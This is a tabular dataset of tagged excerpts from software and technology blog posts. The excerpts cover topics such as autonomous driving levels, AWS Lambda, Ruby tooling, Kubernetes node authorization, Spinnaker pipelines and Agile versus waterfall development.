616,"Ninety-five percent of new vehicles sold will be fully autonomous by 2040. A decade ago that prediction seemed unimaginable to the everyday consumer, but it is becoming more plausible with products and services that have intertwined artificial intelligence (AI) into our daily lives. The Society of Automotive Engineers (SAE) describes the changing role of the driver to driverless vehicles in six levels up to complete autonomy. (See Figure 1)The first three stages are focused on monitored driving, where the driver must actively analyze the environment, and the last three stages are focused on non-monitored driving, where an autonomous driving system analyzes the environment. Transitioning from these two disparate approaches requires a change in regulations, infrastructure and mindset. Most importantly, it demands a guarantee that the latter, technological approach is just as reliable and accurate. (To learn more about the SAEs different levels of automation, see Driverless Cars: Levels of Autonomy. )Figure 1: The SAE Levels of Automation Marking the Transformation from No Automation to Complete Autonomy Source: Adapted from Mike Lemanski Self-driving cars entering the market will need hybrid engines that provide the ability to switch from a manual to self-driving mode, allowing humans and machines to work together, giving drivers a feeling of security. This need for security when leveraging AI not only applies to the automotive industry, but also software development. The SAEs framework from monitored to non-monitored driving has highlighted a widespread autonomous chasm where humans and machines must work together to provide assurance in products and services across industries.","['Software Testing', 'Artificial Intelligence', 'Software Development']",5
617,"Automation engineers in the bottom right are Maintainers. They rely on conservative, prudent measures to ensure test automation scripts are accurate. Maintainers understand the need for expansive test coverage, but can be skeptical of an approach that is not individually programmed to their application properties. Their careful approach toward test automation fosters stability and accuracy, especially when testing between highly similar objects, but can be difficult to maintain against dynamic properties. (For more on automation, see Automation: The Future of Data Science and Machine Learning? )Testers in the top left are Visualists who have adopted visual testing capabilities that are often powered by artificial intelligence. AI in software quality enables automated tools to access application properties often missed by standard object recognition techniques. For example, by capturing UI elements at a textual level with AI, software teams can ease maintenance for dynamic properties and broaden coverage for complex consoles, data visualization tools and PDFs.","['Software Testing', 'Artificial Intelligence', 'Software Development']",13
618,"Get<Foo>(foo => __url__ == Some Name) then you might have another part of your application that wants to get foos that have the same name. These instances could be in completely separate areas of the application, but DRY indicates that you should try to build a common function so that you dont have duplicate code. DRY may lead you to come up with something like this: Whats interesting about this to me, is that you have just de-abstracted your data access. In order to keep things consistent you will now need many data access functions that are specific that call into a more generic way of accessing data. This is a simple example that may seem obvious at first, but imagine if instead of just getting a foo by name, the passed in expression was much more complicated: There would come a point when someone would say Hey we have this 3 line expression in 5 parts of the code, lets make one function that does this. This specific query expression is contextual to this spot in the application.","['Software Design', 'Software Patterns', 'Design Patterns', 'Software Design Patterns', 'Software Development']",15
619,"To make the launching of different namespaces and integration with uidmap simpler Akihiro created a project called rootlesskit. Rootlesskit also takes care of setting up networking for rootless containers. By default rootless docker uses networking based on moby/vpnkit project that is also used for networking in the Docker Desktop products. Alternatively, users can install slirp4netns and use that instead. -We want to thank Akihiro Suda again for all the outstanding work he has done to make this feature happen. Make sure to also check out his Usernetes project that aims to provide Kubernetes support without requiring root.","['Docker', 'Rootless', 'Containers']",7
620,"At this point, I was ready to make dinner and call it a day but there was one more thing I wanted to do before wrapping up the experiment. Something to always consider when doing a benchmark on AWS is that it is always region dependent. Each AWS region is designed to be completely isolated from other Amazon regionsthis means physical proximity, hardware, power supply, etc. The instance type availability differs from region to region and so can the code that is deployed within each region. us-east-1 is AWSs oldest region and has the widest possible skew in terms of instance availability and workloads. I wanted to find out if the observed Lambda idle timeouts were also consistent here so I repeated the above experiment in us-east-1.","['AWS', 'AWS Lambda', 'Serverless', 'Cold Start', 'Performance']",11
621,"Enter RVM, the ruby version manager. This nifty command-line utility allows the engineer to use more than one track by trivially switching the tracks as they engineer each train (`rvm use 2.4.1`). Now the trains can safely travel their appropriate tracks. But what about the energy source? What happens if this new train needs different energy bitsor worse, similar but not-exactly-the-same bits (different application dependency versions). RVM provides a concept of a gemset, which allows the engineer to switch or share the third rail as well. RVM makes it easy to remove tracks and can keep all of the tracks safe from collision with one another, or with the pre-installed system tracks.","['Ruby', 'Bundler', 'Software Development']",7
622,"However, the energy bits have been added one at a time via gem install to each third-rail as each train has needed it. Manually installing dependencies as they are encountered makes experimenting with new energy bits, testing different tracks, or enlisting additional engineers tedious and difficult. Locomotives can also cause damage to shared tracks or third-rails inadvertently, leaving other locomotives inoperable! So, how can we make the trains run reliably in different places? How do we ensure that the energy needs are easily communicated? If only there were a way to declare what energy bits each train requires Enter Bundler, energy storage for the trains locomotive. Bundler installs and keeps track of the exact application dependencies and versions that are needed for an application. With Bundler, the train itself declares its specific energy requirements using a manifest file (Gemfile). An engineer can use the manifest file to ensure that the train runs smoothly on any tracks and that the energy bits are delivered from the train itself, rather than from the tracks. This energy car also ensures that only the energy bits of this train are available for use by this train only.","['Ruby', 'Bundler', 'Software Development']",10
623,"With your Edge Services identified, next, consider your data caching strategy. Start by evaluating your current global data strategy. How does data flow in and out of your services? Where and how is data stored currently? What are the data consistency and availability requirements for your application? Augment your dependency graph with this information.","['Cloud Computing', 'Edge Computing', 'Software Architecture', 'Technology', 'Cloud Native']",8
624,The Cloud is a relatively stable platform that may experience a complete outage just a few times in a year. Think of the Cloud like civilization: urbanized and modernized. Think of the Edge like the frontier: untamed and wild. Catastrophic failure at the Edge is not an exception; it is the rule. Edge-Native applications must plan for catastrophic failure. Some Edge sites may suffer single points of failure in their network and power supplies.,"['Cloud Computing', 'Edge Computing', 'Software Architecture', 'Technology', 'Cloud Native']",11
625,"They present playable system dynamic models that can help people and organizations inhabit the complexity of future risks. As digital technology spread to the mainstream in the last decades, video games have emerged as an increasingly popular cultural phenomenon. In turn, this has led to broad interest in game mechanics as a way to approach strategic challenges in a range of sectors, whether on digital platforms or face to face. Well-designed games, like well-designed governance systems, involve decisions with consequences: a set of simple rules engenders emergent complexity. Participants can explore new ways to address threats and opportunities, while bonding and building trust in ways that are both serious and fun.","['Climate Change', 'Innovation', 'Game Development', 'Gameplay', 'Geoengineering']",5
626,"There are currently no governance mechanisms regulating the research and potential deployment of geoengineeringthe technically feasible option to deliberately manipulate the global climate by spreading sulfur in the stratosphere in order to obstruct sunlight and reverse the effect of global warming. At a 2017 conference in Berlin, a game session explored potential governance mechanisms for geoengineering. Changing regional climates were embodied through foam dice, where 1 marked a drought and 6 a flood. The shape of the dice became more irregular over time, making extreme events more likely. After a few rounds, teams had the option to hack the climate. The geoengineering technology was represented by an electric knife that could chop off pieces of foamhopefully bringing regional climates to more normal behavior in the short-term, but with unclear implications for other regions. When one participant actually tried to alter the climate, a remarkable range of reactions emerged from other individuals and teamsfrom silent endorsement to self-sacrifice and even threat of nuclear war. The discussion that ensued had a level of emotional intensity that brought visceral realism to the intellectual examination of potential governance frameworks to prevent predatory geoengineering.","['Climate Change', 'Innovation', 'Game Development', 'Gameplay', 'Geoengineering']",5
627,"Ive been working in technology throughout my career and have seen the software development space mature and evolve through a number of methodologies. Most of these ideas are common sense productivity enhancements drawing from different sectors. A few years ago it was all about moving from the waterfall development model to more agile, lean methods. Recently Ive joined a forward thinking company who are embracing Dev Ops. Verifa has taken agile methodology and provides the structure to bring the benefits to the wider business. Lets make coding fun again Dev Ops is a new buzzword in computing circles. It encompasses many common sense ideas about the integration between business and technology and provides the narrative to bring development, delivery and operations together.","['Software Development', 'Technology', 'Software Engineering', 'Tech', 'Management']",12
628,"Always keep thinking about the whole system. Ask yourself, How can I build in more feedback loops? Monitoring, metrics, and logging are three feedback loops that bring operations back into design. The successful Dev Ops environment will encourage processes that can create short, effective feedback loops, such as incident control system, blameless post-analysis, and transparency Lean Management Lean = simple. Break your project into small batches of work, build in progress limits, feedback loops and visualization. This is my favourite element to bring to a project; lean management practices lead to better organizational outputs, including system throughput and stability and less stress and greater personal satisfaction.","['Software Development', 'Technology', 'Software Engineering', 'Tech', 'Management']",13
629,"You want to build a social media website. There are multiple ways to get an MVP done, and each team usually has experience in a few of them. Each one will try to sell their preferred programming languages as the best choice for your product. But youre not a software engineer, you cant differentiate between their preferences, and why does it really matter if they get it done? Few months pass by, your MVP is on the market and your startup idea proves to be a success. You now want to take your product a step further and implement new features, but you find it hard to assemble or find a team of developers to continue working on your MVP because its based on obscure or old technologies. You find yourself forced to rewrite the MVP from scratch, which costs money and delays any additional features for some months. The same thing happens if you decide to stop collaborating with your chosen company: it will be hard to find another team willing to continue a project on a poorly chosen tech stack.","['Startup', 'Technology', 'Software Development', 'Entrepreneurship', 'Apps']",0
630,"You come across a team that made video games, a hardware device, a social media platform and something involving blockchain. You see they have a very exhaustive list of technologies theyre good at, they must really know their stuff, right? A diversified portfolio could mean the company is a master of all tech stacks, with many tech departments or with extremely versatile developers. But only in a perfect world. More often than not, a diversified portfolio translates into a jack of all trades, master of none team, which builds things that just work. This approach is common in companies that dont have enough clients to justify being picky for projects using the same technology stack. Using similar tech stack on multiple projects means faster and more qualitative products, which translates into more revenue, and companies rarely choose to have a diversified tech portfolio if they have the option not to.","['Startup', 'Technology', 'Software Development', 'Entrepreneurship', 'Apps']",12
631,"APIs can be free or paid, based on their usage. Even when paid, their price is low enough to justify using them instead of implementing your own solution. API providers dont give you access to their source code, they expose some black box functionalities to be used over the internet. This means that your project relies on their long term lifespan: when an API goes out of business, any component that depends on it must be rewritten. An example is Facebook severely limiting or shutting down parts of their APIs for Instagram (source: Tech Crunch), making any product that relied on them suddenly useless. This kind of event happens rare enough with large companies to still justify using their APIs, but allow any obscure APIs into your project and theres a high chance it will suddenly stop working a few months after its finished and you paid for it.","['Startup', 'Technology', 'Software Development', 'Entrepreneurship', 'Apps']",17
632,"One of the teams you found is suggesting to use a revolutionary tech released one month ago, which is quickly on the rise and is better in every aspect than its predecessors. Being one step ahead of the competition is another no-brainer, and you cant really judge experience on recently released tech because nobody had time to use it, right? While we recommend using technologies which are new and popular, always research the teams experience with said technology. Most teams must swap to whats new and popular every few years, and if the proposed tech is too new, chances are theyre shoving it just to get their developers warmed up with their new architecture. Even if its superior in every way, that new programming language will bring instability and bugs if the engineers are not used to it. Theyll not be able to reuse tested components, the way they can with tech in their portfolio. Sure, it has its advantages, like the code running faster because its better optimized and scales better with thousands of simultaneous users, but is this a real issue when youre a startup? Unless absolutely necessary or the pros clearly outweigh the cons, we recommend to go with the tried-and-true, boring, stable tech stack thats still new, rises in popularity, but had enough time to be tested on the market.","['Startup', 'Technology', 'Software Development', 'Entrepreneurship', 'Apps']",12
633,"The first is that these elements are often changed independently. For example, you may want to present the same content, with the same business logic, but with a different style. Or you may want to present different content, but with the same style and logic. Keeping these elements separate makes it easy to swap out one without affecting the others, especially if the interactions between them are formal and well-definedjust plug and play! Another reason is that there are often different team roles associated with these different elements. The person in charge of managing the content might not be the same as the person designing the look and feel of the site. Separating the domains allows individuals to work freely without stepping on each others toes; it also means that they are not forced to understand parts of the system that dont relate to their task. Thus, a person whose job it is to craft the style sheets for the site doesnt need to learn how to maintain a content database as well; people can specialize.","['Software Engineering', 'Software Development', 'Programming']",19
634,"Think for a moment about the geographical outlines of countries on a map. What defines the shape of these borders? In some cases, the border is an arbitrary political boundarya straight line. However, in most cases the border follows a natural terrain boundary such as a river or mountain range. Because these terrain features are barriers, it means that there is stronger and more frequent commercial and cultural intercourse within the boundaries than across them. Thus, the boundaries denote strongly-connected regions, while separating regions that are more weakly-connected.","['Software Engineering', 'Software Development', 'Programming']",14
635,"Limiting a kubelet to read-only access for those objects that are relevant to it, is a big step in preventing a compromised cluster or workload. The kubelet, however, needs write access to its Node and Pod objects as a means of its normal function. To allow for this, once a kubelets API request has passed through Node Authorization, its then subject to the Node Restriction admission controller, which limits the Node and Pod objects the kubelet can modifyits own. For this to work, the kubelet user must be system:node:<node Name>, which must belong in the system:nodes group. Its the node Name component of the kubelet user, of course, which the Node Restriction admission controller uses to allow or disallow kubelet API requests that modify Node and Pod objects. It follows, that each kubelet should have a unique X.509 certificate for authenticating to the API server, with the Common Name of the subject distinguished name reflecting the user, and the Organization reflecting the group.","['Kubernetes', 'Cloud Computing', 'Giant Swarm', 'Cloud Security', 'Microservices']",11
636,"by Kender Elford For some time now, my team has been well versed in building JVM-based services that run in EC2. We adopted continuous delivery years ago and are now comfortable deploying our software in a canary style, which has saved our bacon on several occasions. Recently, weve begun to dip our toes into newer AWS technologies, including Lambda and Amazon SQS FIFO (First-In-First-Out) queues. We have a long history of using SNS (Simple Notification Service) to deliver events to our various pipelines, but Amazon SNS lacks the ability for a subscription to write a group id for FIFOs. We felt this was a good place for us to start experimenting with Lambdas. We ended up building a re-usable AWS Lambda component to take care of these subscriptions for us that can be deployed using our existing deployment infrastructure.","['AWS', 'Lambda', 'Continuous Delivery', 'Cloudformation']",10
637,"Version A version can be created or removed, but not updated. Whenever its created, it becomes a copy of whatever $LATEST is currently. Cloud Formation is smart enough to know that an update to the Function comes first. The version also allows you to specify a base64 encoded sha256 signature of the expected function code, so you cant accidentally create a version of something you didnt expect (e.g. create a new Version without updating the Function or upload the wrong artifact to the Function, etc.). Cloud Formation will automatically create incrementing Version numbers for you.","['AWS', 'Lambda', 'Continuous Delivery', 'Cloudformation']",18
638,"Change reference to the code in your Function. This triggers Cloud Formation to update the $LATEST Version. Add a new Version, leaving the existing Version alone. Reference the new Version in the existing Aliass routing configuration, with an appropriately small weight set on the canary Version Update your existing stack with the new template. You should create a change set and review before executing the change.","['AWS', 'Lambda', 'Continuous Delivery', 'Cloudformation']",7
639,"Lets take a look at this example using a fictional testing framework that supplies the commonly supplied pass() and fail() assertions: Were on the right track here, but were missing some information. Lets try to answer the 5 questions using the data available in this test: What is the unit under test? 'should add the new entity'What was the actual output? We didnt supply this data to the testing framework.","['JavaScript', 'Technology', 'Tdd', 'Unit Testing']",13
640,"Heres the signature for RITEways assert(): The assertion must be in a describe() block which takes a label for the unit under test as the first parameter. A complete test looks like this: Which produces the following: Lets take another look at our 2.5 star test from above and see if we can improve our score: What is the unit under test? 'given an entity: should read the same entity from the api'What was the actual output? { id: 'baz', foo: 'bar' }What was the expected output? { id: 'baz', foo: 'bar' }How do you reproduce the failure? Now the instructions to reproduce the test are more explicitly spelled out in the message: The given and should descriptions are supplied.","['JavaScript', 'Technology', 'Tdd', 'Unit Testing']",15
641,"As the developer or project manager. You should make sure you do this part correctly to avoid spending a lot of time on things that could be avoided. Things that could be avoided include: Debugging Every project is different. There are many tools out there. But the thing to do is, if theres anything you do very often. Often taking time away from the problem and improving your skill and knowledge about that feature will speed up and fix many of the inefficient things you are bound to do.","['Swift', 'iOS', 'Software Development', 'Apps', 'System']",13
642,"Spending too much time on one aspect of bug fixing Finding the bug. Considering all the other parts it might mess up. If any of these take way too long, you have yourself an inefficiency.","['Swift', 'iOS', 'Software Development', 'Apps', 'System']",13
643,"Optionals Optionals are a great way to handle errors. Especially if a function returns an optional type. Your models should have failable initializers. Use optionals and make sure to always log when its nil and maybe even why it might be nil.do-catch Learn your throwing and do-catch, try, try?","['Swift', 'iOS', 'Software Development', 'Apps', 'System']",15
644,"The best way I found to organize all your error types, is to create a file called All Errors and include all your errors in there. Now the specific functions that throw errors will have to go everywhere in the app, so a common pattern is needed to make it more manageable. It would also be nice to have some kind of central file that manages all the error throwing and rethrowing functions. Dont worry you will see how all this should work in a simple manner at the end of the article. For now the thing to understand is to general reasons and motivations for doing certain things. In fact the specific implementation can vary quite a bit.","['Swift', 'iOS', 'Software Development', 'Apps', 'System']",9
645,"But more importantly every initializer should be failable. If you follow this pattern everywhere youll get used to it. But what purpose does it serve? You should apply data validation on every parameter in your initializer. If Person objects initializer has a parameter Int named age, and your business requires a mature audience, then return nil for ages 18 and under. For most purposes your backend will take care of this and about 99% of the time everything will work as expected, but having this airtight data validation everywhere will make your system better. If a part of your system already handles that, then why should you handle it, isnt that redundant and a waste of time? So doing this between every point where data is exchanged between large parts, will decouple your system and make it more robust, even if the other part is completely changed. In software there are many times youre tempted to be lazy, sometimes that can lead to novel solutions and shortcuts. But mostly it just leads to an error riddled piece of shit app.","['Swift', 'iOS', 'Software Development', 'Apps', 'System']",9
646,"Nice automated way of doing most features is through protocols. I like the idea of conforming to different protocols that represent different features and just tag them on the view controllers. It makes it clear what each controller has for features. Furthermore, by declaring the functions in the protocol extensions you hide away some implementation, get some functions that you can just call. But its also nice to be able to handle errors at the last layer to do something one off. In that case just relay the error as one of the completion closures parameters.","['Swift', 'iOS', 'Software Development', 'Apps', 'System']",15
647,"Ive had a soft spot for Go since the first time I tried it. Its really fast, easy to learn and has one of the best code benchmarks on AWS Lambda. Here are some of my highlights from the repository This is a smart way to get the environment variables using Lookup Env2. This is the function for sending a slack notification, (we need to setup an incoming webhook to get the URL).3. This is a AWS IAM SDK for Go usage example Once youre done with your Go code, the next step is to find the fastest, easiest, and reusable way to deploy our Go code. The next sections will try to explain how to do it in detail! As you know, managing a simple infrastructure is pretty easy using the AWS Console, but when the infrastructure grows up it becomes harder to handle. For this reason, at Empathy Broker we have started using Terraform to provision our underlying AWS infrastructure.","['AWS', 'Developer', 'Lambda', 'Serverless', 'Terraform']",6
648,"I hope that this taster has gotten you just as excited about whats possible with serverless architecture and infrastructure automation as I was six months ago. You can download the completed project here. In future posts, we will see how to leverage what weve shared here to build more awesome stuff. If you want to learn more about Empathy Broker and how we do things head over to our blog. If you liked this, Id also recommend that you read my colleague, Jos Hermosillas, post on the other monitoring practices weve put in place to comply with the GDPRDo you have any questions about infrastructure or an experience youd like to share? Id love to hear from you! Im a Telecommunications Engineer and an eager beaver in Dev Ops culture. I started working in On-Premise infrastructure where the interdependence between teams gets really complicated. Happily for me, for the last 6 months I was totally focused in infrastructure automation of AWS using Terraform at Empathy Broker. Furthermore, Im an AWS Certified Sys Ops Administrator Associate, an AWS Certified Solutions Architect Associate and an AWS Certified Developer Associate.https://cdn.dribbble.com/users/731671/screenshots/2865790/stranger-things-rigo.pnghttps://media.giphy.com/media/3o7qi Zd2ORh Xiqo EDe/source.gifhttps://m.media-amazon.com/images/M/MV5BYz I0MGFl Nm Ut MDc1My00M2M1LTlm ZWQt MDNm OGI4Mj Ji Zm Uy Xk Ey Xk Fqc Gde QXVy Nz Q0MDUy Mzg@._V1_SY1000_SX1500_AL_.jpg.","['AWS', 'Developer', 'Lambda', 'Serverless', 'Terraform']",6
649,"For example, some dependencies may exist in a microservice, it cause a certain complicated deploy dependency like component A has dependencies to before B and C. C is independent. In this case, C is independently deployable and B should be deployed before A. 1, use GCR push as trigger and deploy C. 2, use GCR push for A and B as trigger and then deploy in order B to A.","['Docker', 'Spinnaker', 'Kubernetes', 'Kustomize', 'Ci Cd Pipeline']",18
650,"IMO, this kind of complicated procedure requires Uncle Spinnaker and brings the difficulty to deploy. As much as possible, splitting Application into small units to make services independent. This opinion should be different between teams, so its highly recommended to discuss how do your team use.2. Pipeline (and Template)Pipeline has mainly 2 components.21. Trigger Trigger is the start event to begin the deploy configured on a pipeline. It can be GCR push, file update of certain Githubs branch, Jenkins Job, Webhook.","['Docker', 'Spinnaker', 'Kubernetes', 'Kustomize', 'Ci Cd Pipeline']",18
651,"In GUI, its configured within Configuration.","['Docker', 'Spinnaker', 'Kubernetes', 'Kustomize', 'Ci Cd Pipeline']",7
652,"For example, just to make Trigger reusable, you can make Template as follows:and then publish to Spinnakers persistence layer by roer pipeline-template publish gcr-trigger-template.yaml Roughly speaking, there are 3 tools to do pipeline as code (lets call it as Pa C since now). In this story, we use roer.1.roerroer is A thin CLI for Spinnaker. Also, roer can dry-run if its resource files are deployable or not. Its just a syntax checker, deploy can fail even if this dry-run has passed. roer calls v1 template API and in a maintenance for a while. In detail, see this blog post.2. spinspin is an official CLI to enable Pa C, using v2 template API. spin can create pipeline-template, pipeline, and application. According to slack channel, spin with jsonnet is going to be a promising way.3. The documentation is quite rich, but not being actively developed these days.","['Docker', 'Spinnaker', 'Kubernetes', 'Kustomize', 'Ci Cd Pipeline']",15
653,"Spinnaker is designed to be used among a certain community: team, company. There are options to set proper permissions for users, for ex. enable to edit settings from GUI. You can enable these permission controls tied to GSuite accounts or LDAP within a company.","['Docker', 'Spinnaker', 'Kubernetes', 'Kustomize', 'Ci Cd Pipeline']",7
654,"The war is over and we won. Agile methodology, whatever one might understand by that, proved to be the most efficient way of running software development projects. Team members are happily coding, testing and deploying products. Management adopted Agile methodology and recognised its value. Satisfied customers are eager to try out new features. Other industries are queueing up to join the revolution.","['Agile', 'Software Development', 'Technology', 'Leadership', 'Project Management']",12
655,"Or so some of us believed. The truth is there was never any war. There are no good or bad guys here, no winning or losing sides. We are just thousands and millions of professionals working in the IT industry and exploring the best way to deliver quality products. And there is no such thing as the Agile methodology. There is an Agile approach and there are many methodologies adopting it in one way or another. And no, it is not over, or ever will be. In fact, the whole Agile philosophy involves constant improvement. And while we are on the subject, other industries do not envy our precious agileness. In terms of efficiency and productivity, we are way behind other trades, mere apprentices standing on the shoulders of giants.","['Agile', 'Software Development', 'Technology', 'Leadership', 'Project Management']",12
656,"There is no widespread adoption of Agile as we might think. Those of us lucky enough to work in developer-centric, modern environments might be excused for not noticing that the rest of the world is lagging behind. Many organisations are struggling with trust, skills or staffing issues. For some adopting mainstream Agile does not make any sense. Others do Agile in name only, just to keep up with the current trends. Or they let their development teams do this Agile thing all the way they want, as long as the Gantt chart is up to date and the change management process is strictly followed. And please, log your hours before you leave for the day. So here is the ugly truth that I have recently had a chance to experience in a rather brutal way: most organisations are struggling with adopting Agile.","['Agile', 'Software Development', 'Technology', 'Leadership', 'Project Management']",12
657,"What does it even mean Agile? There are many organisations in Agile Industrial Complex that would gladly explain it to you. Join one of many courses they offer and you will learn how to apply a rigorous technique which will lead you to better efficiency. You will also learn why other techniques are not true Agile. Or you can hire a consultant to take you on Agile journey. Their presence indicates many things wrong with Agile today. In this article, we will attempt to answer what it means by Agile, what problems it solves and how it helps with the challenges of developing software. But let us start where it is customary to do so: at the beginning.","['Agile', 'Software Development', 'Technology', 'Leadership', 'Project Management']",12
658,"Our industry emerged in 1954 with the creation of the first COBOL compiler. Unsurprisingly the creator of the compiler was met with the protest: But Grace, then anyone will be able to write programs!. In the decades that followed, indeed masses started to write programs. We see software in all aspect of our lives, from driving a car to teaching to smoking cigarettes to brushing teeth. Across the world, there are many garages that act as incubators for new ideas. This plethora of innovative and successful products is what makes the industry so attractive.","['Agile', 'Software Development', 'Technology', 'Leadership', 'Project Management']",16
659,"But first IT projects were nothing like that. Computers were big and expensive, resources were sparse. Only governments and organisations with large budgets could afford to run IT projects. That stands in contrast to other trades that humankind conceived over millennia. It was usual to start slow and small, and over the time appropriate practices would emerge. Construction, cars, health, education and virtually every industry started in that way. The fact that IT was initially dominated by big projects shaped the way we created software for a long time.","['Agile', 'Software Development', 'Technology', 'Leadership', 'Project Management']",16
660,"Most software development projects followed the same path. Some smart people conceived the idea and passed it down to others for further analysis. Technical sages prepared the grand design. The code was written according to the plan and handed over for verification. Finally, happy users were trained to use the system. In the meantime, project managers monitored the whole execution and made sure everything went according to the plan.","['Agile', 'Software Development', 'Technology', 'Leadership', 'Project Management']",12
661,Some deliver the wrong product to the wrong people at the wrong time. Many get all of these issues or get canned altogether. Imagine 70% of bridges collapsing over time or 70% of operations causing health complications for patients. It is our duty to reverse this trend and rebuild the reputation of the industry. In the long term we will all benefit.,"['Agile', 'Software Development', 'Technology', 'Leadership', 'Project Management']",1
662,"So far, I have purposefully put emphasis on the phrase IT projects. Projects have their beginning and end. They have their own rhythm and budget. They have project managers who make sure that everyone adheres to the plan. But neither developers nor customers are focused on projects. We create and use products, which are much more persistent in their nature. Budgets are important, but much more important is customer satisfaction. It is good to have a plan, but it is the unplanned that makes the difference. And the earlier the product is delivered to the customers, the better.","['Agile', 'Software Development', 'Technology', 'Leadership', 'Project Management']",0
663,"The workflow presented above naturally imposes assembly-line work organisation. At each station, actors (workers) add their part and hand over the semi-finished product to the next in line. Tasks are clearly defined and project managers with the plan act as conveyors. And so business analysts gather requirements, architects design, developers code, testers verify and support does maintenance. There are some serious implications of such work organisation. Firstly, people have a tendency to slip mindlessly into roles ascribed due to situational attribution, nature of conformity and power of authority. This is done at the cost of personal development, character virtues, and contribution to areas outside of specialization. Secondly, it leads to team fragmentation. Teams are divided into factions, often split up in different locations, which only toughens the divide. Thirdly, such work organisation erodes the sense of responsibility for the end product as each actor can only be accountable for their part. Lastly, it provokes the blame game up and down the stream.","['Agile', 'Software Development', 'Technology', 'Leadership', 'Project Management']",12
664,"Factions in disintegrated teams are growing apart both functionally and organisationally. Moreover, the vision of each faction narrows to inputs and outputs used for their operations. That leads to Platos Cave effect. Factions develop their own sets of beliefs and practices based on limited access to information and crippled capabilities. To get a grip over disintegrating teams, companies often inaptly utilize methods like intrusive communication, meetings overload and forced team-building exercises. That only leads to even stronger feeling of isolation.","['Agile', 'Software Development', 'Technology', 'Leadership', 'Project Management']",12
665,"Walking on water and developing software from a specification are easy if both are frozen. Software is built from specific requirements gathered in the first phase of waterfall SDLC. As this is happening an inevitable change to the requirements will occur. There are many different reasons for specification changes, from new functionality to technical difficulties to infrastructure requirements to defects. Change occurring at different phases of the project has different costs associated with it. The following diagram presents the common cost implications of change: By the nature of change, it is not known when and if it will occur, or what the scope of the change is. Also, the classical waterfall SDLC does not assume any reassessment of requirements or reaction to defects. Much effort has been put into making waterfall model more adaptable. The general assumption is to add a mechanism to feed back the issue up the stream to decision makers. This is the best shown in this diagram: This is quite difficult to follow, no matter how process-oriented teams are. Even the most reactive amendment to the waterfall model cannot mitigate the fact that change is intrinsically against the natural flow in the model. But the fact is that during the software development lifecycle requirement changes will happen, and they will happen often. As each change in effect leads to better-suited software, we need to revise the perception of change: from a problem to a competitive advantage. Any rigorous process around the change restricts this window of improvement.","['Agile', 'Software Development', 'Technology', 'Leadership', 'Project Management']",13
666,"But weve always done it this way. Variations to specification are what most management will try to identify, track and contain. But software development teams also have to respond to changing environments. This includes, but by no means is limited to, changes in:team dynamics: leavers, joiners, upskilling, deskilling, personal circumstances, career progression, project fatigueworking environment: office setup, hot summer, January blues, safety concerns, impact of terrorismcompany: reputation, culture, reorganization, financial position, leadershipindustry: changes in processes, design, architecture, practices and utilities with the effects beyond non-functional requirements; shifting industry focus can cause talent drain in other areas, elusive nature of technological breakthroughs, workforce internationalisation and ease of migration, unemployment level, inclusive/exclusive nature of tech workers Some of these environmental variations might be difficult to identify. Software development teams have to respond quickly to such changes, minimizing their negative effects or preferably turning them into an advantage. While doing it, the team has to keep a balance between maintaining its integrity and adaptation to a changing environment.","['Agile', 'Software Development', 'Technology', 'Leadership', 'Project Management']",12
667,"This agency is the body responsible for adapting to the environmental change. It might be located inside the team. It means that the agency is closer to the problems, but might be lacking the perspective, skills or required authority to apply appropriate responses. It could also be located outside of the team. But its distance to the team and lack of understanding of internal dynamics might result in inefficiency, ignoring the problem or applying wrong medicine to wrong illness. Also, an authoritarian nature of external agency might cause resentment within the team. Placing the agency both inside and outside might lead to overlapping responsibilities and conflict. Lack of the agency leads to lower productivity as the environment develops over time.","['Agile', 'Software Development', 'Technology', 'Leadership', 'Project Management']",0
668,"The entropy of any closed system increases over time as proved by Second Law of Thermodynamics . Increased entropy leads to lower work outcome. This is why it is so important to maintain order in Complex Adaptive System like software development team. As stipulated by cybernetics, feedback mechanism plays the key role in maintaining order. The environment that the team operates in, constantly changes, in consequence requiring adaptation of team processes and practices. The classic waterfall model puts the burden of calibrating the system on an external body (upper management, steering committee, etc.). These attempts to adapt to changes are often inadequate (too little, too late) or do not have buy-in from the team.","['Agile', 'Software Development', 'Technology', 'Leadership', 'Project Management']",5
669,"The more disintegrated the team becomes, the more hindered the communication between its factions is. This is often reflected in the resulting product. Direct communication is replaced by overreliance on the documentation passed between factions. Factions often resort to work-to-rule attitude when each directive in the form of specification is complied with very literary, even when actors are aware of potential negative effects. The examples of such behaviour are developers precisely implementing the specification even though they are aware that it is not compatible with other parts of the system or previous work. This self-inflicted damage is caused by two factors: urge of proving the point (desire to be heard) and creating a safety net for any future blame game. This behaviour lowers actors initiative and reduces the sense of ownership. Another consequence of communication by specification is the Broken Telephone game effect: the greater distance from the source and the more hops in specifying requirements, the more distorted the meaning becomes. Obviously, such effects are very undesirable.","['Agile', 'Software Development', 'Technology', 'Leadership', 'Project Management']",12
670,"The map is not the territory. The map with perfect fidelity would become the terrain itself and therefore rendered useless. In the less drastic scenario, imagine a map of the UK with the size of mile by mile. At this scale, all granular details are already lost, but the map is still not very handy for navigation. On the other hand, such map is detailed enough that any organic changes happening in the territory are not reflected on the map. Therefore, it becomes out-of-date the moment it is printed. A balance has to be found between map accuracy and its usefulness and maintainability. Also, there is only one source of truth: the terrain. When map and terrain differ, follow the terrain. That leads us to the conclusion that even the best model is only a reduced representation of the reality, or in other words all models are wrong but some are useful. Unfortunately for many people the map appears more real than the land.","['Agile', 'Software Development', 'Technology', 'Leadership', 'Project Management']",14
671,"Technical specification provides a model that developers use to implement the required functionality. Ironically, after reaching some threshold, the more details the specification contains, the less useful it becomes. There is a growing trend to replace traditional formal specification with approaches like Design by Contract, Behaviour-driven Development, Consumer-driven Contracts and many others. Although used for slightly different purposes solving different problems, they share one common thing: they concentrate on why over how. The specification becomes a roadmap with inviolable rendezvous points. The actual mileage might vary, but as long as the key points are visited, the goals are met. This means that the implementation is negotiated between different factions of the team on the way. Most projects manager might flinch in the face of such atrocity, but this is merely recital of the facts that truth can only be found in one place: the code. There are two aspects to consider before taking this approach. Firstly, it requires the team to have a high sense of ownership. Secondly, there is a risk that developers are handed keys to power and effectively become interpreters of black magic of source code.","['Agile', 'Software Development', 'Technology', 'Leadership', 'Project Management']",12
